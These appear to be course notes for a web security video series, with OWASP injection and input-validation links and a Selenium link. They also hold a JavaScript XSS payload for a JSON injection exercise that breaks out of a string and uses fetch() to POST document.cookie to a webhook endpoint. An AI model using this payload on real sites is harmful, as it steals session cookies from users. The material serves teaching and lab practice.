# Video 7.2

* [[OWASP] A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection)
* [[OWASP] WSTG: Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)

# Video 7.4

* [Selenium WebDriver](https://www.npmjs.com/package/selenium-webdriver)

* Payload for XSS on JSON injection excercise.

```js
//replace with your own endpoint
var payload = 'Neat site"});fetch("https://webhook.site/4fc9cc8e-c8cc-XXXX-a385-607ef4351cd2",{method: "POST", body:document.cookie});({ time: "2022-02-29", who: "Friend", body: "Neat site';
```